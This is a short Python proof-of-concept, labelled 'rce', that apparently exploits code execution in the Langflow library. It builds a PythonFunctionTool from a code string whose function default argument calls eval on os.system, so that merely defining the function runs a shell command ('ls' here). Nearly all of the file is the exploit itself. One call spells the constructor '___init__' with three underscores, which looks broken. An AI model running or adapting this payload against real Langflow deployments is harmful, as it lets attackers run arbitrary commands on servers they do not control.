import langflow

# rce

code = """
def x(y=eval('__import__("os").system("ls")')):
    pass
"""

code1 = """
def x():
    pass
"""

func = langflow.interface.importing.utils.get_function(code1)

target = langflow.interface.tools.custom.PythonFunctionTool(name="xx", description="xx", code=code1, func=func)
target.___init__(name='dhsa', description="dae", code=code)